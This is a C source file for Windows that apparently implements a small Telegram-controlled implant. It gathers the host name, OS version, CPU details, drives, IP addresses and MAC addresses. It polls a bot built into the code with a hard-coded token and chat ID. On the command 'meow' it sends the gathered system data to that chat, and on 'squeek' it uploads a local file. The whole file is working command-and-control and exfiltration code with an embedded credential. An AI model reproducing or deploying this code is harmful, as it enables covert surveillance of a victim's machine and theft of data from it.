#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iphlpapi.h>

#define CHAT_ID "5547299598"
#define TOKEN L"bot8077364032:AAHTJbcbULWSH7dXAX3l8xpmUZzP6EeL7VQ"
#define FILENAME "cat1.png"

char* extract_last_message(const char* json) {
  const char* msgStart = strstr(json, "\"text\":\"");
  if (!msgStart) return NULL;
  msgStart += strlen("\"text\":\"");
  const char* msgEnd = strchr(msgStart, '"');
  if (!msgEnd) return NULL;
  size_t len = msgEnd - msgStart;
  char* result = malloc(len + 1);
  strncpy(result, msgStart, len);
  result[len] = '\0';
  return result;
}

int get_last_user_message(char* out[1], int* lastUpdateId) {
  HINTERNET hSession = WinHttpOpen(L"GetUpdates", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
  if (!hSession) return 1;

  HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
  if (!hConnect) return 1;

  wchar_t endpoint[512];
  swprintf(endpoint, 512, L"/%ls/getUpdates?offset=%d&timeout=10", TOKEN, *lastUpdateId);

  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", endpoint, NULL, WINHTTP_NO_REFERER, NULL, WINHTTP_FLAG_SECURE);
  if (!hRequest) return 1;

  if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) return 1;
  if (!WinHttpReceiveResponse(hRequest, NULL)) return 1;

  DWORD dwSize = 0;
  WinHttpQueryDataAvailable(hRequest, &dwSize);
  char* buffer = malloc(dwSize + 1);
  DWORD dwDownloaded = 0;
  WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded);
  buffer[dwDownloaded] = '\0';

  const char* uid = strstr(buffer, "\"update_id\":");
  if (!uid) return 1;
  *lastUpdateId = atoi(uid + strlen("\"update_id\":")) + 1;

  *out = extract_last_message(buffer);

  free(buffer);
  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hSession);
  return 0;
}

int sendText(const char* text) {
  wchar_t endpoint[256];
  swprintf(endpoint, 256, L"/%ls/sendMessage", TOKEN);

  char body[1024];
  snprintf(body, sizeof(body), "chat_id=%s&text=%s", CHAT_ID, text);

  HINTERNET hSession = WinHttpOpen(L"SendText", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
  HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", endpoint, NULL, WINHTTP_NO_REFERER, NULL, WINHTTP_FLAG_SECURE);

  WinHttpSendRequest(hRequest, L"Content-Type: application/x-www-form-urlencoded\r\n", -1, body, strlen(body), strlen(body), 0);
  WinHttpReceiveResponse(hRequest, NULL);

  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hSession);
  return 0;
}

int sendFile(const char* filePath) {
  const char* replyMarkup = "{\"keyboard\":[[\"🐱 meow\",\"🐭 squeek\"]],\"resize_keyboard\":true,\"one_time_keyboard\":true}";
  const wchar_t* endpoint = L"/bot8077364032:AAHTJbcbULWSH7dXAX3l8xpmUZzP6EeL7VQ/sendDocument";

  FILE* file = fopen(filePath, "rb");
  if (!file) return 1;
  fseek(file, 0, SEEK_END);
  long size = ftell(file);
  rewind(file);
  BYTE* content = malloc(size);
  fread(content, 1, size, file);
  fclose(file);

  const char* boundary = "----meow";
  char head[2048];
  char tail[128];

  snprintf(head, sizeof(head),
    "--%s\r\n"
    "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n"
    "%s\r\n"
    "--%s\r\n"
    "Content-Disposition: form-data; name=\"reply_markup\"\r\n\r\n"
    "%s\r\n"
    "--%s\r\n"
    "Content-Disposition: form-data; name=\"document\"; filename=\"%s\"\r\n"
    "Content-Type: application/octet-stream\r\n\r\n",
    boundary, CHAT_ID, boundary, replyMarkup, boundary, filePath);

  snprintf(tail, sizeof(tail), "\r\n--%s--\r\n", boundary);

  DWORD totalSize = strlen(head) + size + strlen(tail);
  BYTE* postData = malloc(totalSize);
  memcpy(postData, head, strlen(head));
  memcpy(postData + strlen(head), content, size);
  memcpy(postData + strlen(head) + size, tail, strlen(tail));
  free(content);


  HINTERNET hSession = WinHttpOpen(L"SendFile", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
  HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", endpoint, NULL, WINHTTP_NO_REFERER, NULL, WINHTTP_FLAG_SECURE);

  wchar_t header[256];
  swprintf(header, 256, L"Content-Type: multipart/form-data; boundary=%hs", boundary);

  WinHttpSendRequest(hRequest, header, -1, postData, totalSize, totalSize, 0);
  WinHttpReceiveResponse(hRequest, NULL);

  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hSession);
  free(postData);
  return 0;
}

// send data to Telegram channel using winhttp
int sendSysteminfo(const char* message) {
  const char* chatId = "5547299598";
  HINTERNET hSession = NULL;
  HINTERNET hConnect = NULL;

  hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (hSession == NULL) {
    fprintf(stderr, "WinHttpOpen. Error: %d has occurred.\n", GetLastError());
    return 1;
  }

  hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
  if (hConnect == NULL) {
    fprintf(stderr, "WinHttpConnect. error: %d has occurred.\n", GetLastError());
    WinHttpCloseHandle(hSession);
  }

  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/bot8077364032:AAHTJbcbULWSH7dXAX3l8xpmUZzP6EeL7VQ/sendMessage", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
  if (hRequest == NULL) {
    fprintf(stderr, "WinHttpOpenRequest. error: %d has occurred.\n", GetLastError());
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
  }

  // construct the request body
  char requestBody[512];
  sprintf(requestBody, "chat_id=%s&text=%s", chatId, message);

  // set the headers
  if (!WinHttpSendRequest(hRequest, L"Content-Type: application/x-www-form-urlencoded\r\n", -1, requestBody, strlen(requestBody), strlen(requestBody), 0)) {
    fprintf(stderr, "WinHttpSendRequest. Error %d has occurred.\n", GetLastError());
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 1;
  }

  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hSession);

  printf("successfully sent to tg bot :)\n");
  return 0;
}

int main() {
  SetConsoleOutputCP(CP_UTF8);
  char systemInfo[4096];

  // Get host name
  CHAR hostName[MAX_COMPUTERNAME_LENGTH + 1];
  DWORD size = sizeof(hostName) / sizeof(hostName[0]);
  GetComputerNameA(hostName, &size);  // Use GetComputerNameA for CHAR

  // Get OS version
  OSVERSIONINFO osVersion;
  osVersion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
  GetVersionEx(&osVersion);

  // Get system information
  SYSTEM_INFO sysInfo;
  GetSystemInfo(&sysInfo);

  // Get logical drive information
  DWORD drives = GetLogicalDrives();

  // Get IP address
  IP_ADAPTER_INFO adapterInfo[16];  // Assuming there are no more than 16 adapters
  DWORD adapterInfoSize = sizeof(adapterInfo);
  if (GetAdaptersInfo(adapterInfo, &adapterInfoSize) != ERROR_SUCCESS) {
    printf("GetAdaptersInfo failed. error: %d has occurred.\n", GetLastError());
    return 1;
  }

  snprintf(systemInfo, sizeof(systemInfo),
    "Host Name: %s\n"  // Use %s for CHAR
    "OS Version: %d.%d.%d\n"
    "Processor Architecture: %d\n"
    "Number of Processors: %d\n"
    "Logical Drives: %X\n",
    hostName,
    osVersion.dwMajorVersion, osVersion.dwMinorVersion, osVersion.dwBuildNumber,
    sysInfo.wProcessorArchitecture,
    sysInfo.dwNumberOfProcessors,
    drives);

  // Add IP address information
  for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter != NULL; adapter = adapter->Next) {
    snprintf(systemInfo + strlen(systemInfo), sizeof(systemInfo) - strlen(systemInfo),
    "Adapter Name: %s\n"
    "IP Address: %s\n"
    "Subnet Mask: %s\n"
    "MAC Address: %02X-%02X-%02X-%02X-%02X-%02X\n\n",
    adapter->AdapterName,
    adapter->IpAddressList.IpAddress.String,
    adapter->IpAddressList.IpMask.String,
    adapter->Address[0], adapter->Address[1], adapter->Address[2],
    adapter->Address[3], adapter->Address[4], adapter->Address[5]);
  }
  
  char info[8196];
  snprintf(info, sizeof(info), "%s", systemInfo);

  int lastUpdateId = 0;
  while (1) {
    char* msg = NULL;
    if (get_last_user_message(&msg, &lastUpdateId) == 0 && msg != NULL) {
      printf("last command: %s\n", msg);
      if (strstr(msg, "meow") != NULL) {
        sendSysteminfo(info);
      } else if (strstr(msg, "squeek") != NULL) {
        sendFile(FILENAME);
      } else {
        sendText("cat or mouse????");
      }
      free(msg);
    }
    Sleep(2000);
  }
  return 0;
}
